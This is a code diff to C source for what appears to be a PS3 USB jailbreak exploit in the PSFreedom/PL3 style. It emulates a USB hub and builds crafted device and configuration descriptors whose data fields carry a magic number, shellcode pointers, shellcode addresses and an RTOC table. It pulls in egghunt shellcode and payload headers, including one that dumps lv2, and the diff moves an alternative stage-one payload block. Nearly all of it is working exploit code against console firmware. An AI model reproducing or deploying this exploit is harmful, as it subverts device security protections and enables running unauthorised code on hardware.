@@ -4,14 +4,6 @@
 #include "cpu.h"
 #include "usb_ch9.h"
 
-#ifdef ROCKBOX_LITTLE_ENDIAN
-#define LE16(x) (x)
-#else
-#define LE16(x) ((( (x) & 0xFF) << 8) | (( (x) & 0xFF00) >> 8))
-#endif
-
-//#define MARCAN_STYLE
-
 #include "pl3/config.h"
 #include "pl3/shellcode_egghunt.h"
 #include "pl3/default_payload_3_41.h"
@@ -19,6 +11,12 @@
 #include "pl3/default_payload_3_10.h"
 #include "pl3/default_payload_3_15.h"
 #include "pl3/dump_lv2.h"
+
+#ifdef ROCKBOX_LITTLE_ENDIAN
+#define LE16(x) (x)
+#else
+#define LE16(x) ((( (x) & 0xFF) << 8) | (( (x) & 0xFF00) >> 8))
+#endif
 
 #define MAGIC_NUMBER		'P', 'S', 'F', 'r', 'e', 'e', 'd', 'm'
 
@@ -32,7 +30,6 @@
 #error You must specify the target firmware. \
    define a supported FIRMWARE_X_YZ in config.h and recompile.
 #endif /* FIRMWARE_X_YZ */
-
 
 #ifdef USE_JIG
 #define default_shellcode shellcode_egghunt
@@ -80,6 +77,14 @@
 #define PORT1_NUM_CONFIGS	100
 
 #endif /* USE_JIG */
+
+
+//#define MARCAN_STYLE
+#ifdef MARCAN_STYLE
+#include "pl3/marcan_stage1.h"
+#undef default_payload
+#define default_payload marcan_stage1
+#endif
 
 
 const struct usb_device_descriptor HUB_Device_Descriptor = {
@@ -182,14 +187,10 @@ struct {
 	struct usb_interface_descriptor	interface;
 	struct {
 		uint8_t padding[6];
-		#ifdef MARCAN_STYLE
-		uint8_t data[2][8];
-		#else
 		#ifdef USE_JIG
 		uint8_t data[1][8];
 		#else
 		uint8_t data[4][8];
-		#endif
 		#endif
 	} __attribute__ ((packed)) extra;
 } __attribute__ ((packed))
@@ -217,16 +218,11 @@ port1_config_descriptor = {
 	},
 	{
 		.padding			= { 0, 0, 0, 0, 0, 0 },
-		#ifdef MARCAN_STYLE
-		.data[0]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x10, 0x20 },
-		.data[1]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x10, 0x28 }
-		#else
 		.data[0]			= { MAGIC_NUMBER },
 		#ifndef USE_JIG
 		.data[1]			= { SHELLCODE_PTR },
 		.data[2]			= { SHELLCODE_ADDRESS },
 		.data[3]			= { RTOC_TABLE }
-		#endif
 		#endif
 	}
 };
@@ -437,19 +433,12 @@ const port4_config_descriptor_3 = {
 		.bLength			= 0x3e,
 		.bDescriptorType	= 0x21,
 		.padding			= { 0, 0, 0, 0 },
-		#ifdef MARCAN_STYLE
-		.data[0]			= { 0, 0, 0, 0, 0, 0, 0, 0 },
-		.data[1]			= { 0, 0, 0, 0, 0, 0, 0, 0 },
-		.data[2]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x10, 0x18 }
-		#else
 		.data[0]			= { MAGIC_NUMBER },
 		.data[1]			= { SHELLCODE_PAGE },
 		.data[2]			= { SHELLCODE_DESTINATION }
-		#endif
 	}
 };
 
-#ifndef MARCAN_STYLE
 const struct usb_device_descriptor port5_device_descriptor = {
 	.bLength			= USB_DT_DEVICE_SIZE,
 	.bDescriptorType	= USB_DT_DEVICE,
@@ -512,7 +501,6 @@ port5_config_descriptor = {
 		.bInterval			= 0
 	}
 };
-#endif
 
 const struct usb_device_descriptor final_device_descriptor = {
 	.bLength			= USB_DT_DEVICE_SIZE,
